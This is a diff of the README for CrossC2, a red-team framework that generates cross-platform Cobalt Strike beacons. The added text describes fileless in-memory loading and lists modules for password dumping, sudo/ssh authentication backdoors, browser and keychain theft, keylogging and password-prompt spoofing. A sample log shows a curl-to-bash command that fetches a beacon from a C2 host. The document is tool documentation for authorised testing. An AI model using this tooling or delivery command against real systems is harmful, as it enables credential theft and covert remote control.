@@ -1,17 +1,17 @@
-# Cross C2
+# CrossC2 framework
 
 [README](README.md) | [中文文档](README_zh.md)
 
 🚀 For a faster way, see **cna** introduction [GO📌](#cna-plugin-way)
 
-🔥 **Linux** & **MacOS** supports no file landing, load and execute from memory **dynamic library** or **executable file** [GO📖](https://gloxec.github.io/CrossC2/)
+🔥 **Linux** & **MacOS** supports no file landing, load and execute from memory **dynamic library** or **executable file** [GO📖](https://gloxec.github.io/CrossC2/en/api/)
 
-🔥 Flexibly customize the data return type of the execution file, **portscan**, **screenshot**, **keystrokes**, **credentials** and other user-defined development to achieve more convenient implementation [GO📖](https://gloxec.github.io/CrossC2/)    ( [Sample: GO📌](#CustomExtension) )
+🔥 Flexibly customize the data return type of the execution file, **portscan**, **screenshot**, **keystrokes**, **credentials** and other user-defined development to achieve more convenient implementation [GO📖](https://gloxec.github.io/CrossC2/en/api/commons.html)    ( [Sample: GO📌](#CustomExtension) )
 
 🎉 **Android** & **iPhone** support [GO📌](#Mobile)
 
 
-# Cross C2 - Generator CobaltStrike's cross-platform beacon
+# CrossC2 framework - Generator CobaltStrike's cross-platform beacon
 
 ```
      ▄████▄   ██▀███   ▒█████    ██████   ██████     ▄████▄   ██████▄ 
@@ -32,7 +32,9 @@
 
 # Description
 
-Add beacon generation functions for CobaltStrike's cross-platform beacon. 
+A security framework for enterprises and Red Team personnel, supports CobaltStrike's penetration testing of other platforms (Linux / MacOS / ...), supports custom modules, and includes some commonly used penetration modules.
+
+`Only for internal use by enterprises and organizations, this framework has a certain degree of instability. Non-professionals are not allowed to use it. Anyone shall not use it for illegal purposes and profitability. Besides that, publishing unauthorized modified version is also prohibited, or otherwise bear legal responsibilities.`
 
 
 
@@ -47,6 +49,7 @@ Add beacon generation functions for CobaltStrike's cross-platform beacon.
 | gen beacon (mips[el]) |  |  |  |  |  | ⍻ |
 
 Restricted description:
+* CobaltStrike: currently only supports the last version of cs 3.14(bug fixs).
 * Linux: For particularly old systems, you can choose "Linux-GLIBC" option in cna (around 2010)
 * MacOS: Latest systems only support 64-bit programs
 * iOS: sandbox, restricted cmd
@@ -55,18 +58,83 @@ Restricted description:
 
 # Install & Usage
 
-Reference documents: [📖 Wiki](https://gloxec.github.io/CrossC2/)
+> Download:
 
-Password dump module: using open source projects MimiPenguin2.0, See `CrossC2Kit/mimipenguin/mimipenguin.cna`
+* **CrossC2.cna**
+* **genCrossC2** `(If it is a Windows system, download genCrossC2.Win.exe)`
+
+1. choose `Script Manager`，add `CrossC2.cna` (If successfully installed, the menu bar will have an additional item `CrossC2`)
+2. Modify the `genCC2` path in the` CrossC2.cna` script to the **real path**
+
+```
+77:    $genCC2 = "/xxx/xx/xx/genCrossC2.MacOS";  # <-------- fix
+```
+
+> Create listener and copy key:
+
+For some reasons, only HTTPS beacon is currently supported.
+`C2Profile dynamic analysis will be supported in the future`
+
+**Copy `.cobaltstrike.beacon_keys` from the cs directory on the server to the local directory.**
+
+## Reference documents: [📖 Wiki](https://gloxec.github.io/CrossC2/en/usage/)
+
+## Module: API introduction [📖 Wiki](https://gloxec.github.io/CrossC2/en/api/)
+
+It adopts the method of loading memory without landing, and supports dynamic libraries (.so/.dylib) and executable files (ELF/MachO).
+`⚠️: Although the file is loaded directly from memory, the process can be viewed in ps when the executable file is passed in, but the process name can be customized.`
+
+The type of output information can be freely specified at the time of execution. The return type has been predetermined and can be docked with the native return data type of CS.
+`⚠️: For special data types, such as passwords, port scan results, etc., please refer to the information returned by the native function of cs, which will be matched according to the regular.`
+
+`
+Password dump module: cc2_mimipenguin uses the open source project MimiPenguin2.0, see
+CrossC2Kit / mimipenguin / mimipenguin.cna
+Authentication backdoor modules: cc2_auth, cc2_ssh sudo / su / passwd and other authentication backdoors, ssh is connected and the credentials to connect to other hosts will be recorded.
+Information collection modules: cc2_safari_dump, cc2_chrome_dump, cc2_iMessage_dump, cc2_keychain_dump access records of common browsers, as well as iMessage chat content and authentication credentials saved in the keychain will be obtained.
+Traffic proxy module: cc2_frp supports fast TCP/KCP(UDP) reverse socks5 encrypted traffic proxy.
+Keylogger module: cc2_keylogger records user's keyboard input.
+Network detection module: cc2_portscan, cc2_serverscan for port scanning and service version scanning.
+Privilege promotion module: cc2_prompt_spoof induces deception to obtain user account password.
+Task management module: cc2_job manages the modules running in memory.
+...
+`
+
+## Custom communication protocol: API introduction [📖 Wiki](https://gloxec.github.io/CrossC2/en/protocol/)
+
+Can more easily realize C2Profile configuration and custom communication protocol TCP / UDP and so on.
+
+## cna plugin way
+
+```
+Menu Bar: CrossC2 -> CrossC2 Payload Generator -> genCrossC2
+
+Can be configured in the pop-up dialog:
+1. Select beacon_key (the path cannot contain spaces, the problem is not solved yet)
+2. A dynamic library of custom communication protocols that needs to be bound to beacon
+3. Payload type (Staged generated shellcode requires stagerServer)
+```
+
+![](media/15901534124389/15901617930412.jpg)
+
+The information status will be prompted in the **event** interface during generation
+
+```
+05/01 23:31:03 *** /mnt/cc2/genCrossC2.MacOS 172.16.251.1 5555 /tmp/beacon_keys null MacOS x64 /tmp/CrossC2-test
+05/01 23:31:06 *** genCrossC2 beacon -> *[success] :	Packed 1532232 byte.
+05/01 23:31:07 *** hook hosted CrossC2 beacon MacOS x64 @ http://172.16.251.1:55413/iqEBVKwHoZ
+05/01 23:31:07 *** hook hosted Script Unix Web Delivery (curl) @ http://172.16.251.1:55413/a
+05/01 23:31:07 *** CrossC2 MacOS x64:   curl -A o -o- -L http://172.16.251.1:55413/a | bash -s
+```
+
 
 # Coming soon
 
-1. Rich C2Profile support
-2. Staged Type Shellcode Generation
+1. Rich C2Profile support ✔︎ (Choose custom HTTP module when CNA generates beaocn)
+2. Staged Type Shellcode Generation ✔︎ (Only Linux is temporarily supported, and stagerServer needs to be started on the server)
 3. http-proxy (auth) & socks proxy back connection support
-4. Proxy-Pivots 
+4. Proxy-Pivots  ✔︎ (Temporarily adopt the method of connecting back to socks proxy)
 5. node beacon? (Single node type, can host other beacon without relying on teamserver)
-
 
 # Examples
 
@@ -96,6 +164,32 @@ Develop dynamic libraries and customize data return types, such as implementing 
 
 
 # ChangeLog
+
+## release v1.3 :
+
+* +support Support custom communication protocol (HTTP, TCP, UDP...) .
+* +support A new joblist module has been added to manage programs running without files in persistent memory.
+* +support Reverse proxy module{TCP/KCP(UDP)} that executes without files in memory.
+
+
+md5(genCrossC2.Linux) = 221b3ede4e78fee80f59946f116d7245
+
+md5(genCrossC2.MacOS) = d216cad3fe3c25ead46b85c7ad7051f1
+
+md5(genCrossC2.Win.exe) = a573506e8825b46b041ac3b9307a656b
+
+## release v1.2 :
+
+* +support Support manual selection of key files.
+* +support Support to generate shellcode.
+* -change No longer rely on cobaltstrike.jar (plug-ins can be placed in any directory).
+* -change More flexible and convenient Script Unix Web Delivery.
+
+md5(genCrossC2.Linux) = 2ef7250cc3787d3cbd1e6f99c3c434aa
+
+md5(genCrossC2.MacOS) = eaabde94dd7fed8dabb37cd67a1171c4
+
+md5(genCrossC2.Win.exe) = c65ac808ed3a1000b3ff4ebb8c48ea4e
 
 ## release v1.1 :
 
